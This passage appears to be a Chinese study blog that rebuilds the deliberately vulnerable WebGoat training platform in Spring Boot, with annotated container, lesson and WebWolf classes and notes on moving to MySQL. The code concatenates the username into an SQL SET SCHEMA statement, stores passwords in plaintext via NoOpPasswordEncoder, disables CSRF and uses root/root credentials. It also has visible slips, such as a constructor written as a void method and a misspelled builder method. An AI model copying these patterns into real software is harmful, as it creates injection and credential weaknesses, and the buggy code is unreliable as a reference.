    public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authenticationException) throws IOException, ServletException{
        if (request.getHeader("x-requested-with")!=null){
//            x-requested-with 请求头 区分ajax请求还是普通请求 
            response.sendError(401,authenticationException.getMessage());
        }else {
            super.commence(request,response,authenticationException);
        }
    }

}
```

## lessons

### Initializeable

```java
package com.wanan.webgoat.container.lessons;

import com.wanan.webgoat.container.users.WebGoatUser;

public interface Initializeable {
    void initialize(WebGoatUser webGoatUser);
}
```

## DatabaseConfiguration

```java
package com.wanan.webgoat.container;

import com.wanan.webgoat.container.lessons.LessonScanner;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.flywaydb.core.Flyway;
import org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.jdbc.datasource.DriverManagerDataSource;

import javax.sql.DataSource;
import java.util.Map;
import java.util.function.Function;

@Configuration
//这是一个配置类
@RequiredArgsConstructor
//@RequiredArgsConstructor(onConstructor =@_(@Autowired))
//写在类上可以代替@Autowired注解，需要注意的是在注入时需要用final定义，或者使用@notnull注解
@Slf4j
//使用日志
public class DatabaseConfiguration {
    private final DataSourceProperties properties;
//   用于读取配置信息
    private final LessonScanner lessonScanner;

    @Bean
    @Primary
//    @Primary只是让系统知道如果存在多个相同类型的bean时，自动选择哪一个。
    public DataSource dataSource(){
        DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(properties.getDriverClassName());
//        获取驱动类
        dataSource.setUrl(properties.getUrl());
//        获取路径信息
        dataSource.setUsername(properties.getUsername());
//        获取username
        dataSource.setPassword(properties.getPassword());
//        获取密码
        return dataSource;
    }
    @Bean(initMethod = "migrate")
    public Flyway flyWayContainer(){
        return Flyway
                .configure()
//                创建一个配置
                .configuration(Map.of("driver",properties.getDriverClassName()))
//          取出驱动放入配置中去
                .dataSource(dataSource())
//                从上面的数据源放入flyway中
                .schemas("container")
//                设置管理模式
                .locations("db/container")
//                设置递归扫描迁移的位置为classpath:db/container
                .load();
//              返回flyway对象

    }
    @Bean
    public Function<String,Flyway> flywayLessons(LessonDataSource lessonDataSource){
        return schema -> Flyway
                .configure()
                .configuration(Map.of("driver",properties.getDriverClassName()))
                .schemas(schema)
                .dataSource(lessonDataSource)
                .locations("lessons")
                .load();
    }
    @Bean
    public LessonDataSource lessonDataSource(){return new LessonDataSource(dataSource());}

}
```

## LessonDataSource

```java
package com.wanan.webgoat.container;

import com.wanan.webgoat.container.lessons.LessonConnectionInvocationHandler;
import org.springframework.jdbc.datasource.ConnectionProxy;

import javax.sql.DataSource;
import javax.xml.crypto.Data;
import java.io.PrintWriter;
import java.lang.reflect.Proxy;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class LessonDataSource implements DataSource {
    private final DataSource originalDataSource;

    public LessonDataSource(DataSource dataSource){this.originalDataSource = dataSource;}


    @Override
    public Connection getConnection() throws SQLException {
        var targetConnection = originalDataSource.getConnection();
//        获取与数据库的连接
        return (Connection) Proxy.newProxyInstance(
                ConnectionProxy.class.getClassLoader(),
                new Class[]{ConnectionProxy.class},
                new LessonConnectionInvocationHandler(targetConnection));
    }

    @Override
    public Connection getConnection(String username, String password) throws SQLException {
        return originalDataSource.getConnection(username,password);
//        获取连接
    }

    @Override
    public PrintWriter getLogWriter() throws SQLException {
        return originalDataSource.getLogWriter();
    }

    @Override
    public void setLogWriter(PrintWriter out) throws SQLException {
        originalDataSource.setLogWriter(out);
    }

    @Override
    public void setLoginTimeout(int seconds) throws SQLException {
        originalDataSource.setLoginTimeout(seconds);
    }

    @Override
    public int getLoginTimeout() throws SQLException {
        return originalDataSource.getLoginTimeout();
    }

    @Override
    public Logger getParentLogger() throws SQLFeatureNotSupportedException {
        return originalDataSource.getParentLogger();
    }

    @Override
    public <T> T unwrap(Class<T> iface) throws SQLException {
        return originalDataSource.unwrap(iface);
    }

    @Override
    public boolean isWrapperFor(Class<?> iface) throws SQLException {
        return originalDataSource.isWrapperFor(iface);
    }
}

```

## lessons

### LessonConnectionInvocationHandler

```java
package com.wanan.webgoat.container.lessons;

import com.wanan.webgoat.container.users.WebGoatUser;
import lombok.extern.slf4j.Slf4j;
import org.springframework.security.core.context.SecurityContextHolder;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.sql.Connection;

@Slf4j
//日志系统
public class LessonConnectionInvocationHandler implements InvocationHandler {
    private final Connection targetConnection;

    public LessonConnectionInvocationHandler(Connection targetConnection) {
        this.targetConnection = targetConnection;
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        var authentication = SecurityContextHolder.getContext().getAuthentication();
//        进行身份验证的?
        if (authentication != null && authentication.getPrincipal() instanceof WebGoatUser user){
//            如果拿到的对象输入webgoatuser就执行
            try(var statement = targetConnection.createStatement()){
                statement.execute("SET SCHEMA \"" + user.getUsername() + "\"");
//                使模式成为SQL控制台会话的默认模式。如果不使用此语句，则会将默认模式视为用户模式。如果您正在使用系统用户，则很危险。
            }

        }
        try{
            return method.invoke(targetConnection,args);
        }catch (InvocationTargetException e){
            throw e.getTargetException();
        }

    }
}
```

# 启动一下

主要db下的目录要进行更改,并复制一个sql文件过来,否则无法正常启动

![image-20220713132111818](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713132111818.png)

![image-20220713132146615](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713132146615.png)

# 更改数据库为mysql

我实在是没搞懂这个hsqldb是咋访问的 我们先更改webgoat项目

添加依赖

```xml
<dependency>
    <groupId>mysql</groupId>
    <artifactId>mysql-connector-java</artifactId>
    <version>8.0.17</version>
</dependency>
```

![image-20220713132847377](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713132847377.png)

创建数据库

![image-20220713132712936](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713132712936.png)

修改properties文件

```properties
spring.datasource.url=jdbc:mysql://localhost:3306/webgoat?serverTimezone=GMT%2B8&characterEncoding=utf8&useSSL=true
spring.datasource.username=root
spring.datasource.password=root
spring.datasource.driver-class-name=com.mysql.jdbc.Driver
```

一看这三个肯定都是要更改的

![image-20220713133100515](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713133100515.png)

```properties
spring.jpa.database-platform=org.hibernate.dialect.MySQL5Dialect
spring.datasource.url=jdbc:mysql://localhost:3306/webgoat?serverTimezone=GMT%2B8&characterEncoding=utf8&useSSL=true
spring.datasource.username=root
spring.datasource.password=root
spring.datasource.driver-class-name=com.mysql.jdbc.Driver
```

![image-20220713133236412](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713133236412.png)

这样启动会爆第一个错误 大概意思是sql语法错误,说明前后我们使用的数据库不同

![image-20220713212446172](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212446172.png)

我们先删除这个两个sql文件 备份哦

![image-20220713212550955](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212550955.png)

很明显这样启动也不会有好结果,这是因为我们数据库里并没有这些表

![image-20220713212708628](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212708628.png)

那么我们现在需要去手动添加上这些表

![image-20220714144857063](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220714144857063.png)

![image-20220713212900593](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212900593.png)

![image-20220713212916444](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212916444.png)

![image-20220713212943887](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212943887.png)

![image-20220713213018476](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213018476.png)

![image-20220713213038848](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213038848.png)

![image-20220713213258184](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213258184.png)

![image-20220713213316115](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213316115.png)

![image-20220713213326142](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213326142.png)

![image-20220713213348775](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213348775.png)

有关联关系 你不会不会执行吧?

![image-20220713213506799](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213506799.png)

发现注册的时候报错了 

![image-20220713222315600](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713222315600.png)

但是用户注册上了

![image-20220713222347793](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713222347793.png)

# server

## StartWebGoat

```java
package com.wanan.webgoat.server;

import lombok.NoArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.hsqldb.lib.StringUtil;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.event.ContextStoppedEvent;
import org.springframework.context.event.EventListener;
import org.springframework.stereotype.Component;
import org.springframework.util.StringUtils;

@Component
// 把普通破击实例化到spring容器中
@Slf4j
@NoArgsConstructor
//自动生成无参构造函数
public class StartupMessage {
    private String port;
    private String address;
    @EventListener
//    用于事件的监听
    void onStartup(ApplicationReadyEvent event){
//        这里是启动时做的事情
        if (StringUtils.hasText(port) && !StringUtils.hasText(System.getProperty("running.in.docker"))){
//            运行在docker
            log.info("Please browse to http://{}:{}/WebGoat to get started...",address,port);
//            打出日志
        }
        if (event.getApplicationContext().getApplicationName().contains("WebGoat")){
            port = event.getApplicationContext().getEnvironment().getProperty("server.port");
            address = event.getApplicationContext().getEnvironment().getProperty("server.address");
        }

    }
    @EventListener
    void  onShutdown(ContextStoppedEvent event){

    }

}
```

![image-20220714162530862](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220714162530862.png)

![image-20220714163628605](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220714163628605.png)

# container

## HammerHead

```java
package com.wanan.webgoat.container;

import com.wanan.webgoat.container.session.Course;
import lombok.AllArgsConstructor;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;

@Controller
@AllArgsConstructor
public class HammerHead {
    private final Course course;
    @RequestMapping(path = "/attack",method = {RequestMethod.GET,RequestMethod.POST})
//   接受/attack 的get和post请求
    public ModelAndView attack(){
//        视图层和数据层
        return new ModelAndView("redirect:"+"start.mvc" + course.getFirstLesson().getLink());

    }
}
```

## session

### Course

```java
package com.wanan.webgoat.container.session;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import lombok.extern.slf4j.Slf4j;

import java.util.List;

@Slf4j
public class Course {
    private List<Lesson> lessons;
    public Course(List<Lesson> lessons){
        this.lessons = lessons;
    }
    public List<Category> getCategories(){
        return lessons.parallelStream().map(Lesson::getCategory).distinct().sorted().toList();

    }
    public Lesson getFirstLesson(){
        return getLessons(getCategories().get(0)).get(0);

    }
    public List<Lesson> getLessons(){
        return this.lessons;
    }

    public List<Lesson> getLessons(Category category){
        return this.lessons.stream().filter(l->l.getCategory() == category).toList();
    }
    public void setLessons(List<Lesson> lessons){
        this.lessons = lessons;
    }
    public int getTotalOfLessons(){
        return this.lessons.size();
    }
    public int getTotalOfAssignments(){
        return this.lessons.stream().reduce(0,(total,lessons) -> lessons.getAssignments().size() + total,Integer::sum);
    }

}
```

## assignments

### AssignmentHints

```java
package com.wanan.webgoat.container.assignments;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Target(ElementType.TYPE)
//注解作用于接口 类 枚举
@Retention(RetentionPolicy.RUNTIME)
//注解不仅被保存到class文件中,jvm加载class文件之后依然存在
public @interface AssignmentHints {
    String[] value() default {};
}
```

### AssignmentPath

```java
package com.wanan.webgoat.container.assignments;

import org.springframework.web.bind.annotation.RequestMethod;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Target(ElementType.TYPE)
//存放在接口 类 枚举
@Retention(RetentionPolicy.RUNTIME)
public @interface AssignmentPath {
    String[] path() default {};
    RequestMethod[] method() default {};
    String value() default "";
}

```

### AssignmentEndpoint



### AttackResult

```java
package com.wanan.webgoat.container.assignments;

import com.wanan.webgoat.container.i18n.PluginMessages;
import lombok.Getter;

import static org.apache.commons.text.StringEscapeUtils.escapeJson;

public class AttackResult {
    public static class AttackResultBuilder{
        private boolean lessonCompleted;
//        关卡是否完成
        private PluginMessages messages;
        private Object[] feedbackArgs;
        private String feedbackResourceBundleKey;
        private String output;
        private Object[] outputArgs;
        private AssignmentEndpoint assignment;
        private boolean attemptWasMade = false;
        public AttackResultBuilder (PluginMessages messages){
            this.messages = messages;
        }
        public AttackResultBuilder lessonCompleted(boolean lessonCompleted){
            this.lessonCompleted = lessonCompleted;
            this.feedbackResourceBundleKey = "lesson.completed";
            return this;
        }
        public AttackResultBuilder leslessonCompleted(boolean lessonCompleted,String resourceBundleKey){
            this.lessonCompleted = lessonCompleted;
            this.feedbackResourceBundleKey = resourceBundleKey;
            return this;
        }
        public AttackResultBuilder feedbackArgs(Object... args){
            this.feedbackArgs = args;
            return this;
        }
        public AttackResultBuilder feedback(String resourceBundleKey){
            this.feedbackResourceBundleKey = resourceBundleKey;
            return this;
        }
        public AttackResultBuilder output(String output){
            this.output = output;
            return this;
        }
        public AttackResultBuilder outputArgs(Object... args){
            this.outputArgs = args;
            return this;
        }
        public AttackResultBuilder attemptWasMade(){
            this.attemptWasMade = true;
            return this;
        }
        public AttackResult build() {
            return new AttackResult(lessonCompleted, messages.getMessage(feedbackResourceBundleKey, feedbackArgs), messages.getMessage(output, output, outputArgs), assignment.getClass().getSimpleName(), attemptWasMade);
        }
        public AttackResultBuilder assignment(AssignmentEndpoint assignment){
            this.assignment = assignment;
            return this;
        }

    }
    @Getter
    private boolean lessonCompleted;
    @Getter
    private String feedback;
    @Getter
    private String output;
    @Getter
    private final String assignment;
    @Getter
    private boolean attemptWasMade;

    public AttackResult(boolean lessonCompleted,String feedback, String output,String assignment,boolean attemptWasMade){
        this.lessonCompleted = lessonCompleted;
        this.feedback = escapeJson(feedback);
        this.output = escapeJson(output);
        this.assignment = assignment;
        this.attemptWasMade = attemptWasMade;
    }

    public static  AttackResultBuilder builder(PluginMessages messages){
        return new AttackResultBuilder(messages);
    }
    public boolean assignmentSolved(){
        return lessonCompleted;
    }
}

```

### LessonTrackerInterceptor

```java
package com.wanan.webgoat.container.assignments;

import com.wanan.webgoat.container.session.WebSession;
import com.wanan.webgoat.container.users.UserTracker;
import com.wanan.webgoat.container.users.UserTrackerRepository;
import org.springframework.core.MethodParameter;
import org.springframework.http.MediaType;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.server.ServerHttpRequest;
import org.springframework.http.server.ServerHttpResponse;
import org.springframework.web.bind.annotation.RestControllerAdvice;
import org.springframework.web.servlet.mvc.method.annotation.ResponseBodyAdvice;

@RestControllerAdvice
public class LessonTrackerInterceptor implements ResponseBodyAdvice<Object> {
    private UserTrackerRepository userTrackerRepository;
    private WebSession webSession;
    public LessonTrackerInterceptor(UserTrackerRepository userTrackerRepository,WebSession webSession){
        this.userTrackerRepository = userTrackerRepository;
        this.webSession = webSession;
    }
    @Override
    public boolean supports(MethodParameter methodParameter, Class<? extends HttpMessageConverter<?>> clazz){
        return true;
    }
    @Override
    public Object beforeBodyWrite(Object o, MethodParameter methodParameter, MediaType mediaType, Class<? extends HttpMessageConverter<?>> aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse){
        if (o instanceof AttackResult attackResult){
            trackProgress(attackResult);
        }
        return o;
    }
    protected AttackResult trackProgress(AttackResult attackResult){
        UserTracker userTracker = userTrackerRepository.findByUser(webSession.getUserName());
        if (userTracker == null){
            userTracker = new UserTracker(webSession.getUserName());
        }
        if (attackResult.assignmentSolved()){
            userTracker.assignmentSolved(webSession.getCurrentLesson(),attackResult.getAssignment());
        }else {
            userTracker.assignmentFailed(webSession.getCurrentLesson());
        }
        userTrackerRepository.saveAndFlush(userTracker);
        return attackResult;
    }
}
```

## controller

### Welcome

```java
package com.wanan.webgoat.container.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

@Controller
//Controller 该类代表控制器(控制层 表现层)
public class Welcome {
    private static final String WELCOMED = "welcomed";

    @GetMapping(path = {"welcome.mvc"})
    public ModelAndView welcome(HttpServletRequest request){
        HttpSession session = request.getSession();
//        获取httpsession对象
        if (session.getAttribute(WELCOMED) == null){
//            如果获取到的webcomed是空就进行赋值
            session.setAttribute(WELCOMED,"true");
        }
        ModelAndView model = new ModelAndView();
        model.setViewName("forward:/attack?start=true");
//        这里也是进行请求转发到/attack?start=true
        return model;
    }

}
```

### StartLesson

```java
package com.wanan.webgoat.container.controller;

import com.wanan.webgoat.container.session.Course;
import com.wanan.webgoat.container.session.WebSession;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;

@Controller
public class StartLesson {
    private final WebSession ws;
    private final Course course;

    public StartLesson(WebSession ws,Course course){
        this.ws = ws;
        this.course = course;
    }

    @RequestMapping(path =  "startlesson.mvc",method = {RequestMethod.GET,RequestMethod.POST})
    public ModelAndView start(){
        var model = new ModelAndView();
        model.addObject("course",course);
        model.addObject("lesson",ws.getCurrentLesson());
//        设置model中存放的数据
        model.setViewName("lesson_content");
        return model;
    }
    @RequestMapping(value = {"*.lesson"},produces = "text/html")
//  produces指定返回编码
    public ModelAndView lessonPage(HttpServletRequest request){
        var model = new ModelAndView("lesson_content");
        var path = request.getRequestURI().toString();
//        获取得到的路径 现在我们得到了 /a/b/c/AccessControlMatrix.lesson
        var lessonName = path.substring(path.lastIndexOf('/')+1,path.indexOf(".lesson"));
        
        course.getLessons()
                .stream()
                .filter(l->l.getId().equals(lessonName))
                .findFirst()
                .ifPresent(lesson -> {
                    ws.setCurrentLesson(lesson);
                    model.addObject("lesson",lesson);
                });
        return model;

    }
}
```

## lessons

### CourseConfiguration

```java
package com.wanan.webgoat.container.lessons;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import com.wanan.webgoat.container.session.Course;
import lombok.extern.slf4j.Slf4j;
import org.apache.commons.lang3.ArrayUtils;
import org.hsqldb.lib.ArrayUtil;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.util.CollectionUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.PutMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import java.lang.reflect.Method;
import java.lang.reflect.ParameterizedType;
import java.util.*;

import static java.util.stream.Collectors.groupingBy;

@Slf4j
@Configuration
//将想要的组件添加到容器中
public class CourseConfiguration {
    private final List<Lesson> lessons;
    private final List<AssignmentEndpoint> assignment;
    private final Map<String,List<AssignmentEndpoint>> assignmentsByPackage;

    public CourseConfiguration(List<Lesson> lessons, List<AssignmentEndpoint> assignment) {
        this.lessons = lessons;
        this.assignment = assignment;
        assignmentsByPackage = this.assignment.stream().collect(groupingBy(a ->a.getClass().getPackageName()));
    }
    @Bean
    public Course course(){
        lessons.stream().forEach(l->l.setAssignments(createAssignment(l)));
        return new Course(lessons);
    }

    private List<Assignment> createAssignment(Lesson lesson){
        var endpoints = assignmentsByPackage.get(lesson.getClass().getPackageName());
        if (CollectionUtils.isEmpty(endpoints)){
            log.warn("Lesson:{} hax no endpoints, is this intentionally?",lesson.getTitle());
            return new ArrayList<>();
        }
        return endpoints.stream()
                .map(e->new Assignment(e.getClass().getSimpleName(),getPath(e.getClass()),getHints(e.getClass())))
                .toList();
    }

    private String getPath(Class<? extends AssignmentEndpoint> e){
        for (Method m : e.getMethods()){
            if (methodReturnTypeIsOfTypeAttackResult(m)){
                var mapping = getMapping(m);
                if (mapping != null){
                    return mapping;
                }
            }

        }
        throw new IllegalStateException("Assignment endpoint: " + e + " has no mapping like @GetMapping/@PostMapping etc," +
                "with return type 'AttackResult' or 'ResponseEntity<AttackResult>' please consider adding one");
    }
    private boolean methodReturnTypeIsOfTypeAttackResult(Method m ){
        if (m.getReturnType() == AttackResult.class){
            return true;
        }
        var genericType = m.getGenericReturnType();
        if (genericType instanceof ParameterizedType){
            return ((ParameterizedType) m.getGenericReturnType()).getActualTypeArguments()[0] == AttackResult.class;
        }
        return false;
    }

    private String getMapping(Method m){
        String[] paths = null;
        if (m.getAnnotation(RequestMapping.class)!= null){
            paths = ArrayUtils.addAll(m.getAnnotation(RequestMapping.class).value(),m.getAnnotation(RequestMapping.class).path());
        } else if (m.getAnnotation(PostMapping.class) != null) {
            paths = ArrayUtils.addAll(m.getAnnotation(PostMapping.class).value(), m.getAnnotation(PostMapping.class).path());
        } else if (m.getAnnotation(GetMapping.class) != null) {
            paths = ArrayUtils.addAll(m.getAnnotation(GetMapping.class).value(), m.getAnnotation(GetMapping.class).path());
        } else if (m.getAnnotation(PutMapping.class) != null) {
            paths = ArrayUtils.addAll(m.getAnnotation(PutMapping.class).value(), m.getAnnotation(PutMapping.class).path());
        }
        if (paths == null){
            return null;
        }else {
            return Arrays.stream(paths).filter(path -> !"".equals(path) ).findFirst().orElse("");
        }
    }

    private List<String > getHints(Class<? extends AssignmentEndpoint > e){
        if (e.isAnnotationPresent(AssignmentHints.class)){
            return List.of(e.getAnnotationsByType(AssignmentHints.class)[0].value());
        }
        return Collections.emptyList();
    }

}
```

### Hint

```java
package com.wanan.webgoat.container.lessons;


import lombok.Value;

@Value
//@Value同样会生成getter、toString、hashCode等方法
public class Hint {
    private String hint;
    private String assignmentPath;
}
```

### LessonInfoModel

```java
package com.wanan.webgoat.container.lessons;

import lombok.AllArgsConstructor;
import lombok.Getter;

@Getter
@AllArgsConstructor
public class LessonInfoModel {
    private String lessonTitle;
    private boolean hasSource;
    private boolean hasSolution;
    private boolean hasPlan;
}
```

### LessonMenuItem

```java
package com.wanan.webgoat.container.lessons;

import java.util.ArrayList;
import java.util.List;

public class LessonMenuItem {
    private String name;
    private LessonMenuItemType type;
    private List<LessonMenuItem> children = new ArrayList<>();
    private boolean complete;
    private String link;
    private int ranking;
    public String getName(){
        return name;
    }
    public void  setName(String name){
        this.name = name;
    }
    public  List<LessonMenuItem> getChildren(){
        return children;
    }
    public void setChildren(List<LessonMenuItem> children){
        this.children = children;
    }
    public LessonMenuItemType getType(){
        return type;
    }
    public void setType(LessonMenuItemType type){
        this.type = type;
    }
    public void addChild(LessonMenuItem child){
        children.add(child);
    }

    @Override
    public String toString() {
        StringBuilder builder = new StringBuilder();
        builder.append("Name: ").append(name).append(" | ");
        builder.append("Type: ").append(name).append(" | ");
        return builder.toString();
    }
    public boolean isComplete(){
        return complete;
    }
    public void setComplete(boolean complete){
        this.complete = complete;
    }
    public String getLink(){
        return link;
    }
    public void setLink(String link){
        this.link = link;
    }
    public  void setRanking(int ranking){
        this.ranking = ranking;
        
    }
    public int getRanking(){
        return this.ranking;
    }
}
```

### LessonMenuItemType

```java
package com.wanan.webgoat.container.lessons;

public enum LessonMenuItemType {
//    定义一个枚举类型
    CATEGORY,
    LESSON,
    STAGE
}
```

## WebWolfRedirect

```java
package com.wanan.webgoat.container;

import lombok.RequiredArgsConstructor;
import org.springframework.context.ApplicationContext;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.servlet.ModelAndView;

@Controller
@RequiredArgsConstructor
public class WebWolfRedirect {
    private final ApplicationContext applicationContext;
    @GetMapping("/WebWolf")
    public ModelAndView openWebWolf(){
        var url = applicationContext.getEnvironment().getProperty("webwolf.url");
        return new ModelAndView("redirect:"+url+"/home");
    }
}
```

# webwolf

## user

### UserService

```java
package com.wanan.webgoat.webwolf.user;


import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

@Service
//@Service注解用于类上，标记当前类是一个service类，加上该注解会将当前类自动注入到spring容器中，不需要再在applicationContext.xml文件定义bean了
public class UserService implements UserDetailsService {

    private UserRepository userRepository;

    public UserService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }

    @Override
    public WebGoatUser loadUserByUsername(final String username) throws UsernameNotFoundException{
        WebGoatUser webGoatUser = userRepository.findByUsername(username);
//        调接口去查找用户名
        if (webGoatUser == null){
            throw new UsernameNotFoundException("User not found");
//            抛出新异常User 没找到
        }
        webGoatUser.createUser();
        return webGoatUser;
    }
    public void addUser(final String username, final String password) {
        userRepository.save(new WebGoatUser(username, password));
    }

}
```

### UserRepository

```java
package com.wanan.webgoat.webwolf.user;

import com.wanan.webgoat.container.users.WebGoatUser;
import org.springframework.data.jpa.repository.JpaRepository;

public interface UserRepository extends JpaRepository<WebGoatUser,String> {
//   JpaRepository 主要是用来查询的
    WebGoatUser findByUsername(String username);

}
```

### WebGoatUser

```java
package com.wanan.webgoat.webwolf.user;

import lombok.Getter;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.core.userdetails.UserDetails;

import javax.persistence.Entity;
import javax.persistence.Id;
import javax.persistence.Transient;
import java.util.Collection;
import java.util.Collections;

@Getter
@Entity
public class WebGoatUser implements UserDetails {
    @Id
    private String username;
    private String password;
    @Transient
    private User user;
    protected WebGoatUser(){
    }
    public void WebGoatUser(String username,String password){
        this.username = username;
        this.password = password;
        createUser();
    }
    public void createUser(){
        this.user = new User(username,password,getAuthorities());
        
    }
    public Collection<? extends GrantedAuthority> getAuthorities(){return Collections.emptyList();}

    @Override
    public boolean isAccountNonExpired() {
        return this.user.isAccountNonExpired();
    }

    @Override
    public boolean isAccountNonLocked() {
        return this.user.isAccountNonLocked();
    }

    @Override
    public boolean isCredentialsNonExpired() {
        return this.user.isCredentialsNonExpired();
    }

    @Override
    public boolean isEnabled() {
        return this.user.isEnabled();
    }
}
```

## WebSecurityConfig

```java
package com.wanan.webgoat.webwolf;

import com.wanan.webgoat.webwolf.user.UserService;
import lombok.AllArgsConstructor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpMethod;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.config.annotation.web.configurers.ExpressionUrlAuthorizationConfigurer;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.password.NoOpPasswordEncoder;

@Configuration
//告诉spring 这是一个配置类
@AllArgsConstructor
//作用于类,生成一个参数为所有实例变量的构造方法
@EnableWebSecurity
//用于在项目中启用springsecurity 开启安全认证

public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
    private final UserService userDetailsService;
    @Override
    protected void configure(HttpSecurity http) throws  Exception{
        ExpressionUrlAuthorizationConfigurer<HttpSecurity>.ExpressionInterceptUrlRegistry security = http
                .authorizeRequests()
                //                开启登录匹配
                .antMatchers("/css/**","/images/**","/js/**","/fonts/**","/webjars/**","/home").permitAll()
//                允许匿名的url 可以理解为放行接口 多个接口使用,分割
                .antMatchers(HttpMethod.GET,"/mail/**","/requests/**").authenticated()
//                这些get请求需要登录才能访问
                .antMatchers("/files").authenticated()
//                这些请求需要登录才能访问
                .anyRequest().permitAll();
//              剩余请求可随意访问
        security.and()
//                进行拼接
                .csrf().disable()
//              关闭csrf跨域
                .formLogin().loginPage("/login")
//                设置登录页面
                .failureForwardUrl("/login?error=true");
//                设置登录失败页面

        security.and()
                .formLogin().loginPage("/login")
//                设置表单登录页面
                .defaultSuccessUrl("/home",true)
                .permitAll();
        security.and()
                .logout()
                .permitAll();
//        注销操作

    }

    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception{
        auth.userDetailsService(userDetailsService);
    }
//    将用户设置在内存中
    @Bean
    @Override
    public UserDetailsService userDetailsServiceBean() throws  Exception{
        return  userDetailsService;
    }
    @Bean
    @Override
    protected AuthenticationManager authenticationManager() throws Exception{
        return super.authenticationManager();
    }
    @Bean
    public NoOpPasswordEncoder passwordEncoder(){
        return (NoOpPasswordEncoder) NoOpPasswordEncoder.getInstance();
//        不对密码进行加密操作
    }
}
```

## MvcConfiguration

```java
package com.wanan.webgoat.webwolf;


import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistration;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

import javax.annotation.PostConstruct;
import java.io.File;

@Configuration
//作为配置类
public class MvcConfiguration implements WebMvcConfigurer {
    @Value("${webwolf.fileserver.location}")
    private String fileLocation;

    @Override
